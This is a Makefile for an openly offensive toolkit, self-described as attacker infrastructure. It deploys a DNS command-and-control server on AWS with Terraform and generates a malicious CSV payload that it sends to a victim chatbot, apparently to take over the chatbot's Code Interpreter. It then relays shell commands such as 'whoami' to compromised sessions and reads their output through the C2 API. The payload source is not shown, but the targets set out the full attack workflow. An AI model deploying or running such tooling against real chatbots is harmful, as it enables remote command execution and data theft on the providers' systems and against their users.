# Attacker Infrastructure Makefile
# DNS C2 Server and Attack Tools
#
# This infrastructure is owned by the ATTACKER. It includes:
# - DNS C2 server (EC2) that receives callbacks from compromised targets
# - Attack tools for generating malicious payloads and interacting with sessions
#
# The attacker does NOT have access to victim's Code Interpreter.
# All interaction happens via the C2 server HTTP API.

# Load .env file if it exists
ifneq (,$(wildcard .env))
include .env
export
endif

# =============================================================================
# Setup
# =============================================================================

setup:
	uv sync --all-extras
	@echo ""
	@echo "Setup complete! Run commands with: uv run c2 --help"

# Generate .env from Terraform outputs (run after terraform-apply)
env-from-terraform:
	@if [ ! -d "terraform/.terraform" ]; then \
		echo "Error: Run 'make terraform-init' first"; \
		exit 1; \
	fi
	@echo "# Generated from Terraform outputs" > .env
	@echo "EC2_IP=$$(cd terraform && terraform output -raw instance_public_ip)" >> .env
	@echo "EC2_INSTANCE_ID=$$(cd terraform && terraform output -raw instance_id)" >> .env
	@echo "DOMAIN=$$(cd terraform && terraform output -raw domain)" >> .env
	@echo "S3_BUCKET=$$(cd terraform && terraform output -raw s3_bucket)" >> .env
	@echo "Generated .env file"

# =============================================================================
# Terraform (C2 Infrastructure)
# =============================================================================

terraform-init:
	cd terraform && terraform init

terraform-plan:
	cd terraform && terraform plan

terraform-apply:
	cd terraform && terraform apply

terraform-destroy:
	cd terraform && terraform destroy

# Full deploy: init + plan + apply (auto-approve) + configure
deploy: terraform-init
	cd terraform && terraform plan && terraform apply -auto-approve
	$(MAKE) env-from-terraform
	$(MAKE) configure-ec2
	@echo ""
	@echo "C2 Infrastructure deployed!"
	@echo ""
	@echo "Environment configured in .env"
	@echo "Run: uv run c2 --help"

# Legacy alias
terraform-yolo: deploy

configure-ec2:
	@bash scripts/configure_ec2.sh

# =============================================================================
# C2 Commands (via Click CLI)
# =============================================================================

# Exploit: generate payload + send to victim in one step
# Usage: make exploit (reads ../.victim_url) or make exploit TARGET=https://victim-chatbot.com
exploit:
	@if [ -n "$(TARGET)" ]; then \
		uv run c2 exploit $(TARGET); \
	else \
		uv run c2 exploit; \
	fi

# Attack a target (sends CSV to victim, does not generate)
# Usage: make attack TARGET=https://victim-chatbot.com
attack:
	@if [ -z "$(TARGET)" ]; then \
		echo "Usage: make attack TARGET=https://victim-chatbot.com"; \
		exit 1; \
	fi
	uv run c2 attack $(TARGET)

# Generate malicious CSV
generate-csv:
	uv run c2 generate-csv

# Send command to session
# Usage: make send CMD="whoami" SESSION=sess_abc123
send:
	@if [ -z "$(SESSION)" ] || [ -z "$(CMD)" ]; then \
		echo "Usage: make send CMD=\"whoami\" SESSION=sess_abc123"; \
		exit 1; \
	fi
	uv run c2 send "$(CMD)" -s $(SESSION)

# Receive output from session
# Usage: make receive SESSION=sess_abc123
receive:
	@if [ -z "$(SESSION)" ]; then \
		echo "Usage: make receive SESSION=sess_abc123"; \
		exit 1; \
	fi
	uv run c2 receive -s $(SESSION)

# Connect to session interactively
# Usage: make connect-session (reads from .session_id) or make connect-session SESSION=sess_abc123
connect-session:
	@if [ -z "$(SESSION)" ] && [ -f .session_id ]; then \
		SESSION_ID=$$(cat .session_id); \
		echo "Using session ID from .session_id: $$SESSION_ID"; \
		uv run c2 attach $$SESSION_ID; \
	elif [ -n "$(SESSION)" ]; then \
		uv run c2 attach $(SESSION); \
	else \
		echo ""; \
		echo "No session ID found."; \
		echo ""; \
		echo "Run 'make exploit' or 'make generate-csv' first, or specify manually:"; \
		echo "  make connect-session SESSION=sess_abc123"; \
		echo ""; \
		exit 1; \
	fi

# Aliases for backwards compatibility
attach: connect-session
operator: connect-session

# Check C2 server status
status:
	uv run c2 status

# =============================================================================
# C2 Server Management
# =============================================================================

# View C2 server logs (CloudWatch)
logs:
	@echo "Tailing DNS C2 server logs from CloudWatch..."
	@echo "Log Group: /aws/ec2/dns-c2-server"
	@echo ""
	@aws logs tail /aws/ec2/dns-c2-server --follow --region us-east-1

# Check DNS server status
check-dns:
	@bash scripts/check_dns_status.sh

# Upload updated DNS server to S3, then deploy and restart on EC2
update-dns:
	cd terraform && terraform apply -auto-approve -target=aws_s3_object.dns_server_with_api
	$(MAKE) configure-ec2

# =============================================================================
# Testing
# =============================================================================

test:
	uv run pytest tests/ -v

# Verify DNS protocol implementations match between c2/core/dns_protocol.py and terraform/c2-server/dns_server_with_api.py
verify-protocol:
	@uv run python -c "from c2.core.dns_protocol import encode_chunk_to_ip; \
	import sys; sys.path.insert(0, 'terraform/c2-server'); \
	from dns_server_with_api import encode_chunk_to_ip as server_encode; \
	test_cases = [('abc', False), ('xy', True), ('z', True)]; \
	results = [(encode_chunk_to_ip(*t), server_encode(*t)) for t in test_cases]; \
	assert all(a==b for a,b in results), 'Protocol mismatch!'; \
	print('✓ Protocol implementations verified')"

# =============================================================================
# Cleanup
# =============================================================================

clean:
	rm -rf .venv/
	rm -rf *.egg-info/
	rm -rf .eggs/
	rm -rf build/
	rm -rf dist/
	find . -type d -name __pycache__ -exec rm -rf {} + 2>/dev/null || true
	rm -f .env
	rm -f .session_id
	rm -f malicious_data.csv

destroy: terraform-destroy clean

# =============================================================================
# Help
# =============================================================================

help:
	@echo ""
	@echo "DNS C2 Attacker Infrastructure"
	@echo "==============================="
	@echo ""
	@echo "Setup:"
	@echo "  make setup              Install dependencies with uv"
	@echo "  make deploy             Deploy C2 infrastructure"
	@echo ""
	@echo "Attack Workflow:"
	@echo "  make exploit            Generate payload + send to victim (reads .victim_url)"
	@echo "  make exploit TARGET=url Override victim URL"
	@echo "  make connect-session    Attach to C2 session interactively"
	@echo ""
	@echo "Individual Steps:"
	@echo "  make generate-csv       Generate malicious CSV with payload"
	@echo "  make attack TARGET=url  Send CSV directly to victim chatbot"
	@echo ""
	@echo "Session Commands:"
	@echo "  make send CMD=x SESSION=x   Send command to session"
	@echo "  make receive SESSION=x      Get output from session"
	@echo "  make status                 Check C2 server connectivity"
	@echo ""
	@echo "C2 Management:"
	@echo "  make logs               View C2 server logs"
	@echo "  make check-dns          Check DNS server status"
	@echo "  make update-dns         Redeploy DNS server code"
	@echo ""
	@echo "Or use the CLI directly:"
	@echo "  uv run c2 --help        Show all CLI commands"
	@echo ""

.PHONY: setup terraform-init terraform-plan terraform-apply terraform-destroy \
        deploy terraform-yolo configure-ec2 exploit attack generate-csv send receive \
        connect-session attach operator status logs check-dns update-dns test \
        verify-protocol clean destroy help env-from-terraform
